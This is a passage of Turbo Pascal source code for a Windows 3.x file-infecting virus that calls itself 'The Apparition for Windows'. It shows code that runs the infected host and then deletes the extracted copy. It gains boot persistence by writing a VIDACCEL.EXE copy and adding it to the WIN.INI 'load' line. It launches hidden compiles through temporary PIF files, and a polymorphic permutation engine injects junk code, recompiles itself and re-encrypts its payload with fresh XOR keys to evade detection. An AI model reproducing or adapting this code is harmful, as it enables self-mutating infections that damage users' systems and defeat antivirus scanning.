 If FileSize(F1)=(VSize+CTemplateSize+CSrcSize+ResSize) then
 Begin
  Close(f1);
  exit;
 End;

 Assign(F2,StrPas(Dir)+StrPas(Name)+'.X'+Ne1+Ne2);
 Rewrite(F2,1);
 GetMem(TmpBuf,SizeOf(TempBuf));
 Seek(F1,VSize+CTemplateSize+CSrcSize+ResSize);
 Repeat
  BlockRead(F1,TmpBuf^,SizeOf(TmpBuf^),r);
  BlockWrite(F2,TmpBuf^,r);
 Until r<>SizeOf(TmpBuf^);
 Close(F1);
 Close(F2);
 FreeMem(TmpBuf,SizeOf(TempBuf));
 GetMem(TmpName,256);
 GetMem(t1,16);
 GetMem(t2,16);
 StrCopy(TmpName,Dir);
 StrCat(TmpName,Name);
 StrCat(TmpName,'.X');
 s1:=Ne1+#0;
 s2:=Ne2+#0;
 StrCopy(t1,@s1[1]);
 StrCopy(t2,@s2[1]);
 StrCat(TmpName,t1);
 StrCat(TmpName,t2);
 Handle:=WinExec(TmpName,RealCmdShow);
 FreeMem(TmpName,256);
 FreeMem(t2,16);
 FreeMem(T1,16);
 Ok:=false;
 While GetModuleUsage(Handle)<>0 do UpdateMessages;
 While Not Ok do
 Begin
  UpdateMessages;
  Assign(F2,StrPas(Dir)+StrPas(Name)+'.X'+Ne1+Ne2);
  UpdateMessages;
  SetFAttr(F2,0);
  UpdateMessages;
  Erase(F2);
  UpdateMessages;
  Ok:=(ioResult=0);
 End;
End;

Function Exist:boolean;
Begin
 Assign(F,StrPas(TargetName));
 Reset(F);
 Exist:=(IOResult=0);
 Close(F);
 if ioResult<>0 then ;
End;

Procedure InfectBoot;
Var
 iii:PChar;
 F:File;
 r:integer;
Begin
 If GetProfileInt(TheApparition,BootAlr,0)=1 then
 Begin
  AlrBoot:=True;
  exit;
 End;
 GetMem(iii,512);
 StrCopy(iii,'');
 GetProfileString('windows','load','',iii,512);
 StrCat(iii,' VIDACCEL.EXE');
 WriteProfileString('windows','load',iii);
 GetWindowsDirectory(iii,512);
 StrCopy(targetname,iii);
 StrCat(targetname,'\VIDACCEL.EXE');
 Assign(F,targetname);
 Rewrite(F,1);
 BlockWrite(F,VPtr^,Sizeof(VPtr^),r);
 BlockWrite(F,CTPtr^,Sizeof(CTPtr^),r);
 BlockWrite(F,CSPtr^,SizeOf(CSPtr^),r);
 BlockWrite(F,RPtr^,SizeOf(RPtr^),r);
 Close(f);
 FreeMem(iii,512);
 WriteProfileString(TheApparition,BootAlr,'1');
End;

{
 ------------------------------------------------------------------
		      LZSS Compression engine
 ------------------------------------------------------------------
}


Const
 DicSize=1024;

Var
 RingIndex	   : word;
 Dic		   : array [1..DicSize] of byte;
 Index		   : word;
 SrcLimit,Srcx	   : word;
 SrcPtr,SrcCurr    : ^byte;
 DestPtr,DestCurr  : ^byte;
 DestSz 	   : word;
 StrLen 	   : byte;
 xstr		   : array [1..16] of byte;


Procedure UnpackTemplate;
Begin
 If TemplateUnpacked then exit;
 New(XTPtr);
 XorArea(CTPtr,CTemplateSize,TXor);
 DecompressLZSS(CTPtr,XTPtr,CTemplateSize,XTemplateSize);
 XorArea(CTPtr,CTemplateSize,TXor);
 TemplateUnpacked:=True;
End;



Procedure ShiftAndEnterByte(b:byte);
Var
 w : word;
Begin
 Dic[RingIndex]:=b;
 Inc(RingIndex);
 If RingIndex=DicSize+1 then RingIndex:=1;
End;

Procedure FWriteByte(b:byte);
Begin
 DestCurr^:=b;
 Inc(DestSz);
 DestCurr:=Ptr(Seg(DestCurr^),Ofs(DestCurr^)+1);
End;

Function FReadByte(Var b:byte):boolean;
Begin
 If Srcx=SrcLimit then
  FReadByte:=False
 else
 Begin
  FReadByte:=True;
  b:=SrcCurr^;
  SrcCurr:=Ptr(Seg(SrcCurr^),Ofs(SrcCurr^)+1);
  Inc(Srcx);
 End;
End;

Function GetIndex:word;
Var
 i,j  :integer;
 tt   :boolean;
Begin
 GetIndex:=1025;
 If StrLen=0 then exit;
 For i:=Index to DicSize-strlen-1 do
 Begin
  tt:=true;
  For j:=1 to strlen do
  Begin
   If Dic[i+j-1]<>xstr[j] then tt:=false;
   If Not tt then Break;
  End;
  If tt then
  Begin
   GetIndex:=i;
   exit;
  End;
 End;
End;

Procedure LZSS_SaveBlock;
Var
 b1,b2,i : byte;
Begin
 If StrLen=0 then exit; { To avoid internal errors }
 For i:=1 to StrLen do ShiftAndEnterByte(xStr[i]); {Update dic}
 If StrLen>2 then
 Begin { Save block type (1) }
  b1:=128+64;
  b1:=b1 + (StrLen-1) * 4;
  If (Index and 256)<>0 then Inc(b1);
  If (Index and 512)<>0 then b1:=b1+2;
  FWriteByte(b1);
  b2:=Index and 255;
  FWriteByte(b2);
  StrLen:=0;
  Index:=1;
  exit;
 End;
 For i:=1 to StrLen do
 Begin
  If (xStr[i] and (128 + 64))=(128+64) then FWriteByte(128+64); {ESC-ESC prefix}
  FWriteByte(xStr[i]);
 End;
 StrLen:=0;
 Index:=1;
End;

Procedure LZSS_PackOneByte(b:byte);
Var
 i     : byte;
 ppp   : word;
Begin
 ppp:=Index;
 If StrLen=16 then LZSS_SaveBlock;
 Inc(StrLen);
 xStr[StrLen]:=b;
 Index:=GetIndex;
 If Index=1025 then
 Begin
  Index:=ppp;
  Dec(StrLen);
  LZSS_SaveBlock;
  xStr[1]:=b;
  StrLen:=1;
 End;
End;

Function CompressLZSS(p1,p2:pointer;sz:word):word;
Var
 b : byte;
Begin
 RingIndex:=1;
 Index:=1;
 SrcLimit:=sz;
 SrcPtr:=p1;
 SrcCurr:=p1;
 Srcx:=0;
 DestPtr:=p2;
 DestCurr:=p2;
 DestSz:=0;
 FillChar(Dic,SizeOf(Dic),0);
 strlen:=0;
 RingIndex:=1;
 While FReadByte(b) do
 Begin
  LZSS_PackOneByte(b);
  UpdateMessages;
 End;
 LZSS_SaveBlock;
 CompressLZSS:=DestSz;
End;


Procedure DecompressLZSS(p,dp:pointer; sz,newsz:word);
Var
 b,b1	   : byte;
 i,j,k,l   : word;
 zzz	   : word;
Begin
 RingIndex:=1;
 Index:=1025;
 SrcLimit:=sz;
 Srcx:=0;
 SrcPtr:=p;
 SrcCurr:=p;
 DestPtr:=dp;
 DestCurr:=dp;
 DestSz:=0;
 zzz:=0;
 FillChar(Dic,Sizeof(dic),0);
 While FReadByte(b) do
 Begin
  If ((b and (128+64))=(128+64)) and ((b and (not (128+64)))=0) then { Processing ESC-ESC }
  Begin
   FReadByte(b);
   ShiftAndEnterByte(b);
   FWriteByte(b);
   Continue;
  End;
  If (b and (128+64))=(128+64) then { Processing block type (1) }
  Begin
   FReadByte(b1);
   i:=b1+(b and 3)*256;
   j:=((b div 4) and (1+2+4+8)) + 1;
   StrLen:=1;
   For k:=i to i+j-1 do
   Begin
    FWriteByte(Dic[k]);
    xStr[StrLen]:=Dic[k];
    Inc(StrLen);
   End;
   For l:=1 to StrLen-1 do
    ShiftAndEnterByte(xStr[l]);
   Continue;
  End;
  FWriteByte(b);
  ShiftAndEnterByte(b);
 End;
End;

{
 ------------------------------------------------------------------
		       PIFs execution procedures
 ------------------------------------------------------------------
}

Const
 StandardPif : array [0..544] of char =(
#0,#98,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#0,#2,#128,#0,#0,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#16,#0,#0,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#1,#0,#255,#25,#80,
#0,#0,#7,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#77,#73,#67,#82,#79,#83,#79,#70,
#84,#32,#80,#73,#70,#69,#88,#0,#135,#1,#0,#0,#113,#1,#87,#73,#78,#68,#79,
#87,#83,#32,#50,#56,#54,#32,#51,#46,#48,#0,#163,#1,#157,#1,#6,#0,#0,#0,
#0,#0,#0,#0,#87,#73,#78,#68,#79,#87,#83,#32,#51,#56,#54,#32,#51,#46,#48,
#0,#255,#255,#185,#1,#104,#0,#128,#2,#0,#0,#100,#0,#10,#0,#0,#4,#0,#0,#0,
#4,#0,#0,#3,#16,#2,#0,#29,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,#0,
#0,#0,#0,#0,#0,#0,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,
#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32,#32);
Var
 TempPif : array [0..544] of char;
Const
 PifBusy : boolean = false;

Function ExecViaPif(Path,CmdLine,WorkDir:string):boolean;
Var
 F	 : File;
 r	 : integer;
 handle  : THandle;
 pp	 : PChar;
Begin
 Log('Executing PIF : '+Path);
 ExecViaPif:=false;
 If PifBusy then exit;
 PifBusy:=True;
 Assign(F,WorkDir+'TMP~~PIF.PIF');
 Rewrite(F,1);
 if ioResult<>0 then
 Begin
  PifBusy:=False;
  exit;
 End;
 {Copy execution parameters to PIF}
 Move(StandardPif,TempPif,SizeOf(TempPif));
 Move(Path[1],TempPif[$24],Length(Path));
 WorkDir:=WorkDir+#0;
 Move(WorkDir[1],TempPif[$65],Length(WorkDir));
 Move(CmdLine[1],TempPif[$1E1],Length(CmdLine));
 {Save PIF to file}
 BlockWrite(F,TempPif,Sizeof(TempPif),r);
 if r<>Sizeof(TempPif) then
 Begin
  PifBusy:=False;
  exit;
 End;
 Close(F);
 if ioResult<>0 then
 Begin
  PifBusy:=False;
  exit;
 End;
 GetMem(pp,128);
 StrCopy(pp,@WorkDir[1]);
 StrCat(pp,'TMP~~PIF.PIF');
 handle:=WinExec(pp,sw_Hide);
 FreeMem(pp,128);
 If Handle<32 then
 Begin
  PifBusy:=false;
  exit;
 End;
 While GetModuleUsage(Handle)<>0 do UpdateMessages;
 Erase(F);
 if ioResult<>0 then ;
 ExecViaPif:=True;
 PifBusy:=false;
End;

{
 ------------------------------------------------------------------
			  Permutation engine
 ------------------------------------------------------------------
}
Type
 ProcRec=
 Record
  Name : string [10];
  Func : boolean;
 End;

Const
 NTypes=8;
 LTypes : array [1..NTypes] of char =
  ('w','b','r','c','x','i','s','p');
 Types : array [1..NTypes] of string[10]=
  ('Word','Boolean','Real','Char','PChar','integer','string','pointer');
 NMTypes=3;
 LMtypes : array [1..NMTypes] of char =
  ('w','r','i');
 NAri=3;
 Ari : array [1..NAri] of string[8] = (' + ',' - ',' * ');
 NRel=4;
 Rel : array [1..NRel] of string[2] = ('=','<>','>','<');

Var
 X_Names      : array [1..16] of ProcRec;
 X_Num	      : integer;


Function GName:string;
Var
 s:string[5];
Begin
 s:='';
 Str(Generation,s);
 GName:='Gen_'+s+'_';
End;

Procedure GenVarBlock(Var T:Text);
Var
 i,j : integer;
Begin

 j:=random(8);
 If j=0 then exit;
 Writeln(T,'Var');
 For i:=1 to j do
  Writeln(T,' '+GName+'V',i,':',Types[Random(NTypes)+1],';');
End;

Function GenCondition:string;
Const
 LogicNum=3;
 LogicOp:array [1..LogicNum] of String[4] = ('and','or','xor');
Var
 i,j	   : integer;
 s,s1,s2,s3: string;
 c	   : char;
Begin
 i:=1;
 j:=random(4)+1;
 s:='';
 While i<=j do
 Begin
  s:=s+'(';
  Case random(4) of
   0 : s:=s+'1=2';
   1 : Begin
	c:=LTypes[Random(NTypes)+1];
	Str(Random(4),s1);
	Str(Random(4),s2);
	s:=s+'XX'+c+s1+'='+'XX'+c+s2;
       End;
   2 : Begin
	c:=LMTypes[Random(NMTypes)+1];
	Str(Random(4),s1);
	Str(Random(4),s2);
	s3:=Rel[Random(NRel)+1];
	s:=s+'XX'+c+s1+s3+'XX'+c+s2;
       End;
   3 : s:=s+'1=2';
  End; {Case}
  s:=s+')';
  if i=j then Break;
  s:=s+' '+LogicOp[Random(LogicNum)+1]+' ';
  Inc(i);
 End;
 GenCondition:=s;
End;

Function GenAnyCall:string;
Var
 i,j,k        : integer;
 s,s1,s2,s3,s4: string;
 c	      : char;
Begin
 GenAnyCall:='';
 Case random(4) of
  0: If X_Num>2 then GenAnyCall:=X_Names[Random(X_Num-1)+1].Name;
  1: Begin
      c:=LTypes[Random(NTypes)+1];
      Str(Random(4),s1);
      Str(Random(4),s2);
      GenAnyCall:='XX'+c+s1+':='+'XX'+c+s2;
     End;
  2: Begin
      c:=LMTypes[Random(NMTypes)+1];
      Str(Random(4),s1);
      Str(Random(4),s2);
      Str(Random(4),s3);
      s4:=Ari[Random(NAri)+1];
      GenAnyCall:='XX'+c+s1+':='+'XX'+c+s2+s4+'XX'+c+s3;
     End;
  3: Begin
      c:=LMTypes[Random(NMTypes)+1];
      Str(Random(128),s1);
      Str(Random(128),s2);
      Str(Random(4),s3);
      s4:=Ari[Random(NAri)+1];
      GenAnyCall:='XX'+c+s3+':='+s1+s4+s2;
     End;
 End;
End;

Procedure GenAnyCode(Var T:Text);
Var
 i,j,k  : integer;
Begin
 Writeln(T,'Begin');
 For i:=1 to Random(15)+1 do
 Begin
  Case random(4) of
   0: ;
   1: Begin
       Writeln(T,'if ',GenCondition,' then ');
       Writeln(T,' ',GenAnyCall,';');
      End;
   2: Begin
       Writeln(T,'Repeat');
       For j:=1 to Random(4)+1 do
       Begin
	Writeln(T,GenAnyCall,';');
       End;
       Case random(2) of
	0: Writeln(T,'Until (',GenCondition,') or True ;');
	1: Writeln(T,'Until True;');
       End; {case}
      End;
   3: Begin
       Case random(2) of
	0: Writeln(T,'While (',GenCondition,') And False do');
	1: Writeln(T,'While False do ');
       End; {case}
       Writeln(T,'Begin');
       For j:=1 to Random(4)+1 do
       Begin
	Writeln(T,GenAnyCall,';');
       End;
       Writeln(T,'End;');
      End;
  End; {Case}
 End; {for}
 Writeln(T,'End;');
End;

Procedure ProcessTextFile(n1,n2:string);
Const
 index : word = 0;
 Active : boolean = false;

Var
 T1,T2	      : text;
 s,ss,ws      : string;
 i,j,k        : integer;
Begin
 X_Num:=0;

 Assign(T1,n1);
 Reset(T1);
 if ioResult<>0 then exit;
 Assign(T2,n2);
 Rewrite(T2);
 if ioResult<>0 then
 Begin
  Close(T1);
  exit;
 End;
 While Not(Eof(T1)) do
 Begin
  Readln(T1,s);
  UpdateMessages;
  if pos(PmStart,s)<>0 then Active:=True;
  if pos(PmStop,s)<>0 then Active:=False;

  If (X_Num<16) and (Pos(_Procedure_+' ',s)<>0) and (Random(8)=0) and Active then
  Begin
   Inc(X_Num);
   Inc(index);
   Str(index,ss);
   X_Names[X_Num].Name:=GName+ss;
   If Random(1)=0 then
   Begin {Declaring func}
    X_Names[X_Num].Func:=True;
    Writeln(T2,'Function '+Gname+ss+':'+Types[Random(NTypes)+1]+';');
    GenVarBlock(T2);
    GenAnyCode(T2);
    Writeln(T2);
   End
   else
   Begin {Declaring proc}
    X_Names[X_Num].Func:=False;
    Writeln(T2,_Procedure_+' '+GName+ss+';');
    GenVarBlock(T2);
    GenAnyCode(T2);
    Writeln(T2);
   End;
  End; {declare}

  If (Pos('Begin',s)<>0) and (Pos('End',s)=0) and Active and (Random(64)=0) then
  Begin
   Writeln(T2,s);
   continue;
   GenAnyCode(T2);
  End;
  Writeln(T2,s);
 End;
 Close(T1);
 Close(T2);
End;

Procedure EraseTemp(WD:string);
Var
 F : File;
Begin
 Assign(F,WD+'\TMP$XTMP.T01');
 Erase(F);
 if ioResult<>0 then ;
 Assign(F,WD+'\TMP$XTMP.T02');
 Erase(F);
 if ioResult<>0 then ;
 Assign(F,WD+'\TMP$XTMP.EXE');
 Erase(F);
 if ioResult<>0 then ;
 Assign(F,WD+'\MAIN.RES');
 Erase(F);
 if ioResult<>0 then ;
 FileMode:=0;
End;

Procedure PermutationEngine;
Type
 TFoo=array [1..60000] of byte;
Var
 NewTXor,
 NewRXor,
 NewSXor      : byte;
 t1,t2	      : text;
 ooo	      : string;
 p1,p2	      : ^TFoo;
 WinDir       : string;
 F,F1         : file;
 N1,N2	      : string;
 r,rr,k	      : word;
 BN	      : word;
 cs,css,ss    : word;
Begin
 FileMode:=2;
 Inc(Generation);
 SetDlgItemText(MyWnd,id_status,'PM : Loading...');
 If (BPCPath='') or (UnitPath='') then
 Begin
  SetDlgItemText(MyWnd,id_status,'PM : No compiler :(');
  Log('PM Failed : No compiler');
  exit;
 End;
 Log('PM started');
 SetDlgItemText(MyWnd,id_status,'PM : Unpack...');
 UnpackTemplate;
 WinDir[0]:=Char(GetWindowsDirectory(@WinDir[1],255));
 n1:=WinDir+'\TMP$XTMP.T01';
 n2:=WinDir+'\TMP$XTMP.T02';
 Log('PM is using temp dir '+WinDir);
 if DiskFree(Ord(WinDir[1])-Ord('A')+1)<512*1024 then
 Begin
  Log('PM Failed : Out of diskspace');
  exit;
 End;
 Assign(F,n1);
 Rewrite(F,1);
 if ioResult<>0 then
 Begin
  Log('PM Failed : I/O Error 1');
  exit;
 End;
 bn:=1;
 Repeat
  BlockWrite(F,XSPtr^[bn],10000,r);
  UpdateMessages;
  bn:=bn+10000;
 Until (bn+10000)>=XSrcSize;
 BlockWrite(F,XSPtr^[bn],XSrcSize-bn+1,r);
 UpdateMessages;
 Close(F);
 if ioResult<>0 then
 Begin
  EraseTemp(WinDir);
  exit;
 End;
 SetDlgItemText(MyWnd,id_status,'PM : Mutation...');
 ProcessTextFile(n1,n2);
 Assign(F,WinDir+'\MAIN.RES');
 Rewrite(F,1);
 XorArea(RPtr,SizeOf(RPtr^),RXor);
 BlockWrite(F,RPtr^,Sizeof(RPtr^),r);
 XorArea(RPtr,SizeOf(RPtr^),RXor);
 Close(F);

 SetDlgItemText(MyWnd,id_status,'PM : 1st compile');
 ExecViaPif(BPCPath+'BPC.EXE',n2+' /CW /U'+UnitPath,WinDir+'\');

 Assign(F,WinDir+'\TMP$XTMP.EXE');
 Reset(F,1);
 if ioResult<>0 then
 Begin
  Log('PM Failed : 1st compile failed');
  SetDlgItemText(MyWnd,id_status,'PM : FAILURE');
  EraseTemp(WinDir);
  exit;
 End;
 cs:=FileSize(F);
 Close(F);
 if ioResult<>0 then ;
 Log('1st compile OK.');
 Assign(F,WinDir+'\TMP$XTMP.T02');
 Reset(F,1);
 ss:=FileSize(F);
 If ss>60000 then
 Begin
  Log('PM Failed : Source file too big');
  SetDlgItemText(MyWnd,id_status,'PM : FAILURE');
  EraseTemp(WinDir);
  exit;
 End;
 GetMem(p1,ss);
 GetMem(p2,ss);
 bn:=1;
 Repeat
  If (bn+10000)<ss then
  Begin
   BlockRead(F,p1^[bn],10000,r);
   bn:=bn+10000;
   UpdateMessages;
  End
  else
  Begin
   BlockRead(F,p1^[bn],ss-bn,r);
   bn:=0;
   UpdateMessages;
  End;
 Until bn=0;
 Str(ss,ooo);
 Log('PM : Compression started,   '+ooo+' bytes');
 SetDlgItemText(MyWnd,id_status,'PM : Compression...');
 css:=CompressLZSS(p1,p2,ss);
 Str(css,ooo);
 Log('PM : Compression completed, '+ooo+' bytes');
 SetDlgItemText(MyWnd,id_status,'PM : Updating...');
 NewTXor:=Random(256);
 NewSXor:=Random(256);
 NewRXor:=Random(256);
 Assign(t1,n2);
 Reset(t1);
 Assign(t2,n1);
 Rewrite(t2);
 While Not Eof(T1) do
 Begin
  Readln(t1,ooo);
  UpdateMessages;
  If Pos(tx_const,ooo)<>0 then
  Begin
   Writeln(t2,' TXor=',NewTXor,'; tx_const=''',tx_const,''';');
   Continue;
  End;
  If Pos(rx_const,ooo)<>0 then
  Begin
   Writeln(t2,' RXor=',NewRXor,'; rx_const=''',rx_const,''';');
   Continue;
  End;
  If Pos(sx_const,ooo)<>0 then
  Begin
   Writeln(t2,' SXor=',NewSXor,'; sx_const=''',sx_const,''';');
   Continue;
  End;
  If Pos(cs_const,ooo)<>0 then
  Begin
   Writeln(t2,' VSize=',cs,'; cs_const=''',cs_const,''';');
   Continue;
  End;
  If Pos(xss_const,ooo)<>0 then
  Begin
   Writeln(t2,' XSrcSize=',ss,'; xss_const=''',xss_const,''';');
   Continue;
  End;
  If Pos(css_const,ooo)<>0 then
  Begin
   Writeln(t2,' CSrcSize=',css,'; css_const=''',css_const,''';');
   Continue;
  End;
  If Pos(gn_const,ooo)<>0 then
  Begin
   Writeln(t2,' Generation:word=',Generation,'; gn_const=''',gn_const,''';');
   Continue;
  End;
  Writeln(t2,ooo);
 End;
 Close(T1);
 Close(T2);
 Log('PM : Constants updated');
 SetDlgItemText(MyWnd,id_status,'PM : 2nd compile');
 ExecViaPif(BPCPath+'BPC.EXE',n1+' /CW /U'+UnitPath,WinDir+'\');
 Assign(F,WinDir+'\TMP$XTMP.EXE');
 Reset(F,1);
 if ioResult<>0 then
 Begin
  Log('PM : 2nd compile failed');
  SetDlgItemText(MyWnd,id_status,'PM : FAILURE');
  EraseTemp(WinDir);
  exit;
 End;
 SetDlgItemText(MyWnd,id_status,'PM : Linking...');
 Seek(F,FileSize(F));
 {template}
 XorArea(CTPtr,CTemplateSize,TXor);
 XorArea(CTPtr,CTemplateSize,NewTXor);
 BlockWrite(F,CTPtr^,SizeOf(CTPtr^),r);
 XorArea(CTPtr,CTemplateSize,NewTXor);
 XorArea(CTPtr,CTemplateSize,TXor);
 {compressed src}
 XorArea(p2,css,NewSXor);
 BlockWrite(F,p2^,css,r);
 {resource}
 XorArea(RPtr,SizeOf(RPtr^),RXor);
 XorArea(RPtr,SizeOf(RPtr^),NewRXor);
 BlockWrite(F,RPtr^,SizeOf(RPtr^),r);
 XorArea(RPtr,SizeOf(RPtr^),NewRXor);
 XorArea(RPtr,SizeOf(RPtr^),RXor);

 Close(F);
 k:=ioResult;
 Assign(F1,WinDir+'\VIDACCEL.EXE');
 Erase(F1);
 if ioResult<>0 then ;
 Rename(F,WinDir+'\VIDACCEL.EXE');
 if (ioResult<>0) or (k<>0) then
 Begin
  Log('PM Failed : I/O Error 2');
  SetDlgItemText(MyWnd,id_status,'PM : FAILURE');
  EraseTemp(WinDir);
  exit;
 End;
 Log('PM : Linked OK');
 Permutated:=True;
 EraseTemp(WinDir);
End;


{
 ------------------------------------------------------------------
			      MAIN
 ------------------------------------------------------------------
}

BEGIN
 Log('Started.');
 RealCmdShow:=CmdShow;
 LockTimer:=false;
 FileMode:=0;
 AlrInfNo:=0;
 Paused:=False;
 If GetProfileInt(TheApparition,NoRun,0)=1 then
 Begin
  messageBox(0,'This program is infected by The Apparition for Windows and will not start.','!!! VIRUS WARNING !!!',
    Mb_Ok or mb_IconStop);
  Halt;
 End;
 If GetProfileInt(TheApparition,ShowDots,0)=1 then
 Begin
  If
   MessageBox(0,'Do you really want to run program infected by virus ?','!!! VIRUS WARNING !!!',
    mb_IconStop or Mb_YesNo)
     = id_No then halt;
 End;
 SetErrorMode($1 or $8000);
 AllocateGlobalVars;
 UpdateMessages;
 Prepare;
 If NotEnoughMemory then Goto Skip;
 SelfLoad;
 Log('Loaded OK.');
 Log('InfectBoot = start');
 InfectBoot;
 Log('InfectBoot = done');
 LockSegment(CSeg);

 zu[0]:=Chr(GetProfileString(TheApparition,'AtomID','0',@zu[1],250));
 Val(zu,IDAtom,x);
 If x=0 then
 Begin
  zu[0]:=Chr(GlobalGetAtomName(IDAtom,@zu[1],255));
  If zu<>'ApparitionInstalled' then InfernalSetup;
 End;

 Log('Running application');
 DirectRun;
 Log('Application finished');
 Destruction;

 New(XSPtr);
 XorArea(CSPtr,CSrcSize,SXor);
 DecompressLZSS(CSPtr,XSPtr,CSrcSize,XSrcSize);

 Resident;

 Skip:
END.
